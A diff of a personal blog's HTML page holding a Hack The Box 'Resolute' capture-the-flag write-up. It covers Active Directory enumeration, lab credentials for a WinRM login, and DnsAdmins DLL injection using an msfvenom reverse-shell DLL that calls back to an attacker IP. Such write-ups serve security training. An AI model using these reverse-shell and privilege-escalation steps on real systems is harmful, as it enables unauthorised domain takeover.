@@ -24,7 +24,7 @@
     <title>Hackthebox - Resolute Writeup - A personal cybersecurity blog</title>
     
     
-    <link rel="stylesheet" href="/css/style.min.9167e464480f2f7ea5d94b21496c23d7754ad83cf80376bd5fcb8f7988c7a508.css">
+    <link rel="stylesheet" href="/css/style.min.d25af0bab4d33793898dbd0b3c2137b1b04a01c67b4d3321370361298f0ae3de.css">
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
     <meta property="og:title" content="Hackthebox - Resolute Writeup" />
@@ -33,20 +33,20 @@
 <meta property="og:url" content="/writeups/hackthebox-writeups/hackthebox-resolute-writeup/" />
 <meta property="og:image" content="/img/htb_resolute/card.png" />
 <meta property="og:image" content="/" />
-<meta property="article:published_time" content="2020-05-29T00:00:00+00:00" />
-<meta property="article:modified_time" content="2020-05-29T00:00:00+00:00" />
+<meta property="article:published_time" content="2020-05-28T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-05-28T00:00:00+00:00" />
 
 <meta itemprop="name" content="Hackthebox - Resolute Writeup">
 <meta itemprop="description" content="A medium hard box exploited through ldap. Privilege escalation using DLL injection with the user in DNS Admins group and exploiting the DNS service. Post contains some extra info about ldapsearch, rpcclient, nmap-scripts.">
-<meta itemprop="datePublished" content="2020-05-29T00:00:00&#43;00:00" />
-<meta itemprop="dateModified" content="2020-05-29T00:00:00&#43;00:00" />
+<meta itemprop="datePublished" content="2020-05-28T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2020-05-28T00:00:00&#43;00:00" />
 <meta itemprop="wordCount" content="1230">
 <meta itemprop="image" content="/img/htb_resolute/card.png">
 <meta itemprop="image" content="/">
 
 
 
-<meta itemprop="keywords" content="ldap,ldapsearch,rpcclient,dll injection,dnsadmins,dns,evil-winrm,hydra," /><meta name="twitter:card" content="summary_large_image"/>
+<meta itemprop="keywords" content="ldap,ldapsearch,rpcclient,dll,injection,dnsadmins,dns,evil-winrm,hydra," /><meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="/img/htb_resolute/card.png"/>
 
 <meta name="twitter:title" content="Hackthebox - Resolute Writeup"/>
@@ -196,7 +196,7 @@
             <a href="/tags/cve-2019-14287/" class="tag-list-link">cve-2019-14287</a><span class="tag-list-count">1</span>
             
             
-            <a href="/tags/dll-injection/" class="tag-list-link">dll-injection</a><span class="tag-list-count">1</span>
+            <a href="/tags/dll/" class="tag-list-link">dll</a><span class="tag-list-count">1</span>
             
             
             <a href="/tags/dns/" class="tag-list-link">dns</a><span class="tag-list-count">1</span>
@@ -230,6 +230,9 @@
             
             
             <a href="/tags/hydra/" class="tag-list-link">hydra</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/injection/" class="tag-list-link">injection</a><span class="tag-list-count">1</span>
             
             
             <a href="/tags/john/" class="tag-list-link">john</a><span class="tag-list-count">1</span>
@@ -338,7 +341,7 @@
                         <a href="/writeups/hackthebox-writeups/hackthebox-resolute-writeup/" class="title">Hackthebox - Resolute Writeup</a>
                     </p>
                     <p class="item-date">
-                        <time datetime="2020-05-29 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-29</time>
+                        <time datetime="2020-05-28 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-28</time>
                     </p>
                 </div>
             </li>
@@ -398,19 +401,20 @@
 <span class="article-date">
   <i class="icon icon-calendar-check"></i>&nbsp;
 <a href="/writeups/hackthebox-writeups/hackthebox-resolute-writeup/" class="article-date">
-  <time datetime="2020-05-29 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-29</time>
+  <time datetime="2020-05-28 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-28</time>
 </a>
 </span>
 <span class="article-category">
   <i class="icon icon-folder"></i>&nbsp;
-  <a class="article-category-link" href="/categories/hackthebox-writeups/"> Hackthebox writeups </a>
+  <a class="article-category-link" href="/categories/hackthebox-writeups/"> Hackthebox Writeups </a>
 </span>  
   <span class="article-tag">
     <i class="icon icon-tags"></i>&nbsp;
     <a class="article-tag-link" href="/tags/ldap/"> ldap </a>
     <a class="article-tag-link" href="/tags/ldapsearch/"> ldapsearch </a>
     <a class="article-tag-link" href="/tags/rpcclient/"> rpcclient </a>
-    <a class="article-tag-link" href="/tags/dll-injection/"> dll injection </a>
+    <a class="article-tag-link" href="/tags/dll/"> dll </a>
+    <a class="article-tag-link" href="/tags/injection/"> injection </a>
     <a class="article-tag-link" href="/tags/dnsadmins/"> dnsadmins </a>
     <a class="article-tag-link" href="/tags/dns/"> dns </a>
     <a class="article-tag-link" href="/tags/evil-winrm/"> evil-winrm </a>
@@ -427,19 +431,19 @@
 <h1 id="nmap-scan">Nmap Scan</h1>
 <div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>export <span style="color:#ef6155">ip</span><span style="color:#5bc4bf">=</span>10.10.10.169
 </code></pre></div><div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>nmap -sC -sV -sS -oN nmap.put <span style="color:#ef6155">$ip</span>
-</code></pre></div><p>Open ports:</p>
-<blockquote>
-<p>53/tcp   open  domain?<br>
-88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-29 05:32:58Z)<br>
-135/tcp  open  msrpc        Microsoft Windows RPC<br>
-139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn<br>
-389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)<br>
-445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)<br>
-464/tcp  open  kpasswd5?<br>
-593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0<br>
-636/tcp  open  tcpwrapped<br>
-3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank)</p>
-</blockquote>
+</code></pre></div><p>open ports:</p>
+<ul>
+<li>53/tcp   open  domain?</li>
+<li>88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-29 05:32:58Z)</li>
+<li>135/tcp  open  msrpc        Microsoft Windows RPC</li>
+<li>139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</li>
+<li>389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)</li>
+<li>445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)</li>
+<li>464/tcp  open  kpasswd5?</li>
+<li>593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</li>
+<li>636/tcp  open  tcpwrapped</li>
+<li>3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local)</li>
+</ul>
 <p><img src="/img/htb_resolute/1.png" alt=""></p>
 <p>We see that the server is running windows and has active directory. From the
 nmap scripts we fine the domain name and forest name as <strong>&ldquo;megabank.local&rdquo;</strong>.
@@ -451,40 +455,40 @@ So we add a host to our /etc/hosts file</p>
 <p>We enumerate using enum4linux</p>
 <div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>enum4linux -a <span style="color:#ef6155">$ip</span>
 </code></pre></div><p>In the output, we find the following users and groups</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>Group &#39;Schema Admins&#39; (RID: 518) has member: MEGABANK\Administrator
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>Group &#39;Group Policy Creator Owners&#39; (RID: 520) has member: MEGABANK\Administrator
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>Group &#39;Domain Guests&#39; (RID: 514) has member: MEGABANK\Guest
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\Administrator
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\DefaultAccount
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\krbtgt
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\ryan
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\marko
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\sunita
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\abigail
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\marcus
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\sally
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\fred
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\angela
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\felicia
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\gustavo
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\ulf
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\stevie
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\claire
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\paulo
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\steve
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\annette
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\annika
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\per
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\claude
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\melanie
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\zach
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\simon
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\naoki
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>Group &#39;Domain Admins&#39; (RID: 512) has member: MEGABANK\Administrator
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>Group &#39;Enterprise Admins&#39; (RID: 519) has member: MEGABANK\Administrator
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span>Group &#39;Domain Controllers&#39; (RID: 516) has member: MEGABANK\RESOLUTE$
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>Group &#39;Domain Computers&#39; (RID: 515) has member: MEGABANK\MS02$
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span>Group &#39;Contractors&#39; (RID: 1103) has member: MEGABANK\ryan
+<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>Group <span style="color:#48b685">&#39;Schema Admins&#39;</span> <span style="color:#5bc4bf">(</span>RID: 518<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\A</span>dministrator
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>Group <span style="color:#48b685">&#39;Group Policy Creator Owners&#39;</span> <span style="color:#5bc4bf">(</span>RID: 520<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\A</span>dministrator
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>Group <span style="color:#48b685">&#39;Domain Guests&#39;</span> <span style="color:#5bc4bf">(</span>RID: 514<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\G</span>uest
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\A</span>dministrator
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\D</span>efaultAccount
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\k</span>rbtgt
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\r</span>yan
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\m</span>arko
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\s</span>unita
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\a</span>bigail
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\m</span>arcus
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\s</span>ally
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\f</span>red
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\a</span>ngela
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\f</span>elicia
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\g</span>ustavo
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\u</span>lf
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\s</span>tevie
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\c</span>laire
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\p</span>aulo
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\s</span>teve
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\a</span>nnette
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\a</span>nnika
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\p</span>er
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\c</span>laude
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\m</span>elanie
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\z</span>ach
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\s</span>imon
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\n</span>aoki
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>Group <span style="color:#48b685">&#39;Domain Admins&#39;</span> <span style="color:#5bc4bf">(</span>RID: 512<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\A</span>dministrator
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>Group <span style="color:#48b685">&#39;Enterprise Admins&#39;</span> <span style="color:#5bc4bf">(</span>RID: 519<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\A</span>dministrator
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span>Group <span style="color:#48b685">&#39;Domain Controllers&#39;</span> <span style="color:#5bc4bf">(</span>RID: 516<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\R</span>ESOLUTE$
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>Group <span style="color:#48b685">&#39;Domain Computers&#39;</span> <span style="color:#5bc4bf">(</span>RID: 515<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\M</span>S02$
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span>Group <span style="color:#48b685">&#39;Contractors&#39;</span> <span style="color:#5bc4bf">(</span>RID: 1103<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\r</span>yan
 </code></pre></div><p>We also find the password policy if we need to bruteforce</p>
 <div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span style="color:#5bc4bf">[</span>+<span style="color:#5bc4bf">]</span> Retieved partial password policy with rpcclient:
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>
@@ -558,14 +562,14 @@ Password: Welcome123!</p>
 <div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>evil-winrm -i  megabank.local -u melanie -p Welcome123!
 </code></pre></div><p>And we get a shell as the user melanie</p>
 <p><img src="/img/htb_resolute/4.png" alt=""></p>
-<p>We find our user.txt file under the Desktop. So this is our required user.</p>
+<p>We find our user.txt file under the \Desktop. So this is our required user.</p>
 <p><img src="/img/htb_resolute/5.png" alt=""></p>
 <h1 id="privilege-escaltion---user-ryan">Privilege Escaltion - User ryan</h1>
 <p>In the C: drive we find an interesting folder PSTranscripts/. Going in, we find
 a file &ldquo;PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt&rdquo; inside
 another folder. We have a look at the contents of the file.</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
-</code></pre></div><p><img src="/img/htb_resolute/6.png" alt=""></p>
+<pre><code class="language-poweshell" data-lang="poweshell">type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+</code></pre><p><img src="/img/htb_resolute/6.png" alt=""></p>
 <p>We find the backup of the password for the user <strong>ryan</strong></p>
 <p>Creds:</p>
 <blockquote>
@@ -573,7 +577,7 @@ another folder. We have a look at the contents of the file.</p>
 Password: Serv3r4Admin4cc123!</p>
 </blockquote>
 <p>We try logging in with evilwinrm</p>
-<p>In the <code>\Desktop</code> directory, we fine a note.txt that says</p>
+<p>In the \Desktop directory, we fine a note.txt that says</p>
 <div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>Email to team:
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span>- due to change freeze, any system changes (apart from those to the
@@ -587,7 +591,7 @@ group <strong>dnsadmins</strong></p>
 <p>Members of the group dnsadmins can be used for privilege escalation to admin
 with dll injection. This trick is described <a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">here</a>.</p>
 <p>We can generate our payload dll with msfvenom.</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.55 LPORT=8888 <span style="color:#5bc4bf">-f</span> dll -o dns.dll
+<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>msfvenom -p windows/shell/reverse_tcp <span style="color:#ef6155">LHOST</span><span style="color:#5bc4bf">=</span>10.10.14.55 <span style="color:#ef6155">LPORT</span><span style="color:#5bc4bf">=</span><span style="color:#f99b15">8888</span> -f dll -o dns.dll
 <span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>smbserver.py SHARE ./
 </code></pre></div><p>On target, we can change the config of the dns since the user ryan belongs to
 the group <strong>dnsadmins</strong>. We can also start and stop the dns service.</p>
@@ -610,7 +614,7 @@ generate the payload and do the previous steps again on target.</p>
 </code></pre></div><p><img src="/img/htb_resolute/9.png" alt=""></p>
 <p>We see that we are now a member of the administrator group and can execute
 administrator commands. So we can get our required root.txt at
-<code>C:\Users\Administrator\Desktop\root.txt</code></p>
+C:\Users\Administrator\Desktop\root.txt</p>
 <p><img src="/img/htb_resolute/10.png" alt=""></p>
 
     </div>
